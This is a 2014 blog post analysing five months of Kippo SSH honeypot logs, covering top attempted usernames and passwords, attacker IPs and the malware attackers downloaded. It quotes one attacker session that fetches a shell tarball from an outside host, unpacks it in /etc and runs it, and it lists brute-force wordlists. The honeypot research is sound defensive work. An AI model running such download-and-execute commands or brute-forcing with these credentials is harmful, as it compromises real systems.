--- 
title: 'Running a Kippo Honeypot: Part two'
categories: 
- honeypot
- hacking
- ssh
- kippo
layout: post
date: 2014-04-27
---

Over a year has now passed since I [started playing](http://hackerific.net/2013/04/15/running-a-kippo-honeypot/) with the [Kippo](https://code.google.com/p/kippo/) honeypot, so a quick second post about my findings is _long_ overdue!

I ran Kippo on an overpriced cheap VPS with two-IPs pretty much continuously from between April and September 2013. That's 5 months (154 days). I wrote a short post near the beginning of that time. In my original post on this subject I waffled a bit about how almost all of the attacking traffic I saw was from Chinese IPs and mentioned a few attempted passwords with high entropy. In this post I want to summarise what I saw over the full 5 month period.

## Credentials

First, credentials. The honeypot was configured with a single user account `root` and the password `123456`.

In the time the honeypot was running, I logged 71,264 login attempts – about 463 per day (not all that many, really), and of those attempts 395 were successful.

The most attempted username was `root`, and sorted by number of attempts, the top ten usernames were:

    44193 root
      819 bin
      657 test
      554 oracle
      343 nagios
      240 user
      227 postgres
      189 guest
      187 admin
      157 apache
    
It's interesting that `oracle`, `nagios` and `postgres` all appear more frequently than `apache` or `www-data` (which is even further down the list). Could these indicate a general lack of good security practices on some database and monitoring servers? In that case, where's MySQL? 
    
Counts of password attempts were spread more evenly than usernames, and the most attempted passwords were `changeme`, `123456` and `password`. The list below shows the top ten:
    
    1661 changeme
    1475 123456
    1023 password
     930 1234
     839 abc123
     627 test
     599 12345
     420 123
     327 qwerty
     227 111111
     
This really has to be about the worst possible wordlist. In all, the logs contain login attempts with 6,122 distinct usernames and 18,561 different passwords.

### Strange credentials

I wrote about some of the higher entropy passwords in my last post, highlighting a few of the more interesting strings, but this time some were even more strange. 

Some of the password strings with the highest entropy, according to [Data::Password::Entropy](https://metacpan.org/pod/Data::Password::Entropy) are:

      khaled-dico-ana-wla-akhou-charmouta-feh-kess-ekhtak-bi-ayri-a5ou-a7beh
      sss!Qazxsw22243s2lakeprostsssz1,zPlastaicatraglake
      efwef58sdf2cvsd1*!#&$#_)claudia69iLiE
      Fum4tulP0@t3Uc1d3R4uD3T0t!@#$%^%^&*?
      khaled-dico-ana-wla-akhou-charmouta-tfeh-kess-ekhtak-bi-ayri-a5ou-a7beh
      1$EdkQIoSn$T3gzKLxlcxF7tsTCFqC8M
      209*7fdlkdf%0@)(fUF786__fdk^%^Djfdsahfdsf886D&S%*fd
      dragomirdumitru1q2w3e4r5tsfgdfhvd!Q@W#E$Rsdfdf
      B*(&%^#$SSH?M?a+k3f123!^*backIleSSH@q!@#D
      ortega.123#TradeLinuxKi!l|iN6#Th3h03$%nix@NdR3b!irD


Bizarre! I find it hard to believe that real-life systems are compromised using these passwords, so I suspect that as I said in my previous post they're either set by other tools, or perhaps they're some sort of strange meme which is gradually propagating through script kiddie's word lists. 

I also find the idea that they're '[vanity strings](http://rud.is/b/2012/06/28/honeypot-analytics/)' unlikely, but like the idea that there are thousands of Chinese script kiddies running SSH scanners solely to get into geek's blog posts. 

## Attacker's IPs

As before, Chinese IPs are dominant, but there's also a significant amount of traffic from South America and from cheap hosting companies elsewhere. Here's a list of the top ten individual IPs and country information:

    7129 219.235.230.197  China
    2978 218.85.135.29    China
    2230 218.200.117.241  China
    2153 61.145.121.83    China
    2153 177.86.68.2      Brazil
    2150 188.40.92.147    Germany
    1883 200.54.114.51    Chile
    1847 183.180.32.234   Japan
    1556 218.104.145.16   China
    1438 61.139.54.71     China

I don't think there's anything surprising there.

## Downloads & Sessions

There wasn't much download activity, which is interesting and probably indicates that lots of SSH scanners just run unattended on large blocks and their owners check the results later. Or it could indicate a lack of realism in my honeypot setup.

Over the entire time the honeypot was running there were 25 downloads in total. Most of these were tarballs of scanning tools, but four of the 25 were cachefly test files and Microsoft service packs. In these cases I think the attackers were probably intending to use the system in DoS attacks, and were using the big downloads to jude available bandwidth. 

Here's an example terminal session:

    wget http://cachefly.cachefly.net/100mb.test
    cd /etc; wget http://rootnr1.net76.net/shell.tgz; tar xvf shell.tgz; rm -rf shell.tgz; cd rc.9; chmod +x *
    ./go
    
… at this point kippo starts playing games with the user and they invariably log off but I still have the files to play with. In this case, the payload contains several shell and perl scripts and a lot of pre-compiled binaries, all of which are unpacked into a directory called `rc.9`.     

The perl scripts include [Hawker Hunter v2.0](http://pastebin.com/HVpaBr9u), an IRC bot with port scanning and DoS capabilities and another DoS tool which contains the string "GlobaL Team atack victim" (sic).

Running strings on the binaries reveals some interesting, if dated things. For example, one of the files `h` contains:

    Hide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002
    
And another `stream` contains:

    stream.c v1.0 - TCP Packet Storm
    
Which, according to [this mailing list post](http://packetstormsecurity.com/files/10836/stream-dos.txt.html) from 2000 might exploit an old DoS vulnerability in FreeBSD, Solaris and Linux. It's not clear to me if this is still relevant on modern systems, and if not this payload could have been around for ages. In fact, one of the most noticeable aspects of the payloads I saw was their age; everything's old!.

## Shall we play a game?

Other payloads I saw included a couple of backdoored SSH daemons, one of which includes the amazingly named `openssh-3.6.1p2-backdoor.patch`, and a few different IRC bots and bouncers, such as PyBNC.

The contents of these other downloads are interesting enough to be the subject of another post (in another year?!), so I'll leave with this recorded terminal session:

<script type="text/javascript" src="https://asciinema.org/a/8346.js" id="asciicast-8346" async></script>








    

